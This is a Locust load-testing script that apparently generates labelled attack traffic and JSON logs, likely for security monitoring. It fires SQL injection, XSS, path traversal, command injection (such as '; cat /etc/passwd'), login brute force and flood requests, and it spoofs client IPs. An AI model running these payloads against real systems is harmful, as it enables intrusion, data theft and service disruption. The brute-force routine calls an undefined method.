import random
import json
import logging
import time
import uuid
from locust import HttpUser, task, between
from locust.contrib.fasthttp import FastHttpUser
from datetime import datetime

json_logger = logging.getLogger('json_logger')
json_logger.setLevel(logging.INFO)
json_handler = logging.FileHandler('/mnt/logs/threat_locust_json.log')
json_handler.setFormatter(logging.Formatter('%(message)s'))
json_logger.addHandler(json_handler)

class MaliciousUser(FastHttpUser):
    wait_time = between(1, 10)

    def randomuser(self):
        self.user_id = str(uuid.uuid4())
        self.session_id = str(uuid.uuid4())
        self.client_ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        self.user_agent = random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
            'sqlmap/1.4.7#stable (http://sqlmap.org)',
            'Nikto/2.1.6',
            'Acunetix-WebVulnerability-Scanner/1.0',
        ])
        self.geolocation = random.choice([
            {"country": "Russia", "city": "Moscow", "timezone": "Europe/Moscow"},
            {"country": "China", "city": "Beijing", "timezone": "Asia/Shanghai"},
            {"country": "United States", "city": "Ashburn", "timezone": "America/New_York"},
            {"country": "Netherlands", "city": "Amsterdam", "timezone": "Europe/Amsterdam"},
        ])
        return self

    def on_start(self):
        self.randomuser()

    def get_headers(self):
        return {
            'X-Forwarded-For': self.client_ip,
            'User-Agent': self.user_agent
        }

    @task(2)
    def sql_injection_attempt(self):
        payloads = [
            "' OR '1'='1",
            "' UNION SELECT username, password FROM users--",
            "admin'--",
            "1; DROP TABLE users--",
            "' OR 1=1--",
            "' UNION SELECT null, version()--",
            "' AND 1=2 UNION SELECT null, null--",
            "' OR 'x'='x'--",
            "1; EXEC xp_cmdshell('ping 127.0.0.1')--",
            "<script>alert('XSS')</script>",
             "<img src=x onerror=alert('XSS')>",
             "../../../../etc/passwd",
             "../../../../etc/passwd%00",
             "php://filter/convert.base64-encode/resource=index.php",
             "http://malicious-website.com/malicious-script.php",
              "1; ls -la",
              "1 && whoami",
        ]
        payload = random.choice(payloads)
        self._log_request("GET", f"/products?id={payload}", None, "sql_injection")

    @task(2)
    def xss_attempt(self):
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
        ]
        payload = random.choice(payloads)
        self._log_request("POST", "/search", {"q": payload}, "xss")

    @task(2)
    def brute_force_login(self):
        usernames = ['admin', 'root', 'user', 'test', 'guest', 'applebee', 'ofgirl', 'bigbuffmen', 'alphagamer101', 'donaldtrump']
        passwords = ['password', '123456', 'admin', 'qwerty', 'letmein', 'nonosquare']

        for username in usernames:
            for password in passwords:
                self.setrandom()
                self._log_request("POST", "/login", {"username": username, "password": password}, "brute_force")

    @task(1)
    def path_traversal_attempt(self):
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/hosts",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
        ]
        payload = random.choice(payloads)
        self._log_request("GET", f"/static/{payload}", None, "path_traversal")

    @task(1)
    def command_injection_attempt(self):
        payloads = [
            "; cat /etc/passwd",
            "& ipconfig",
            "| ls -la",
            "`whoami`",
            "$(echo 'vulnerable')",
        ]
        payload = random.choice(payloads)
        self._log_request("GET", f"/exec?cmd=date{payload}", None, "command_injection")

    @task(2)
    def web_scraping(self):
        pages = ["/products", "/categories", "/reviews", "/comments", "/carts", '/information', '/aboutus']
        for page in pages:
            self._log_request("GET", page, None, "web_scraping")

    @task(2)
    def ddos_simulation(self):

        randomuser = random.randint(1,2)
        for _ in range(random.randint(5, 15)):
            # Randomize user_id, session_id, client_ip, and user_agent
            if randomuser == 1:
                self.randomuser()

            actions = [
                lambda: self._log_request("GET", "/", None, "ddos"),
                lambda: self._log_request("GET", f"/products/{random.randint(1, 10)}", None, "ddos"),
                lambda: self._log_request("POST", "/cart", {"product_id": random.randint(1, 10), "quantity": 1}, "ddos"),
                lambda: self._log_request("GET", "/cart", None, "ddos"),
                lambda: self._log_request("POST", "/checkout", {"payment_method": "credit_card"}, "ddos")
            ]

            for _ in range(random.randint(1, 20)):
                random.choice(actions)()

    def _log_request(self, method, path, data, threat_type):
        log_id = str(uuid.uuid4())
        start_time = time.time()
        headers = self.get_headers()
        try:
            if method == "GET":
                response = self.client.get(path, headers=headers)
            elif method == "POST":
                response = self.client.post(path, json=data, headers=headers)
            else:
                raise ValueError(f"Unsupported HTTP method: {method}")

            self._log_response(log_id, method, path, response, start_time, data, threat_type)
        except Exception as e:
            self._log_exception(log_id, method, path, e, start_time, data, threat_type)

    def _log_response(self, log_id, method, path, response, start_time, data, threat_type):
        log_entry = {
            "log_id": log_id,
            "threat_type": threat_type,
            "@timestamp": datetime.utcnow().isoformat(),
            "client_ip": self.client_ip,
            "method": method,
            "url": f"{self.host}{path}",
            "status_code": response.status_code,
            "response_time_ms": int((time.time() - start_time) * 1000),
            "bytes_sent": len(response.request.body) if response.request.body else 0,
            "bytes_received": len(response.content),
            "user_agent": self.user_agent,
            "referer": random.choice([None, "https://www.google.com", "https://www.bing.com", "https://example.com"]),
            "request_headers": self.get_headers(),
            "response_headers": dict(response.headers),
            "geo": self.geolocation,
            "request_body": data if data else None,
        }
        json_logger.info(json.dumps(log_entry))

    def _log_exception(self, log_id, method, path, exception, start_time, data, threat_type):
        log_entry = {
            "log_id": log_id,
            "threat_type": threat_type,
            "@timestamp": datetime.utcnow().isoformat(),
            "client_ip": self.client_ip,
            "method": method,
            "url": f"{self.host}{path}",
            "status_code": 500,
            "response_time_ms": int((time.time() - start_time) * 1000),
            "exception": str(exception),
            "user_agent": self.user_agent,
            "referer": random.choice([None, "https://www.google.com", "https://www.bing.com", "https://example.com"]),
            "geo": self.geolocation,
            "request_body": data if data else None,
        }
        json_logger.info(json.dumps(log_entry))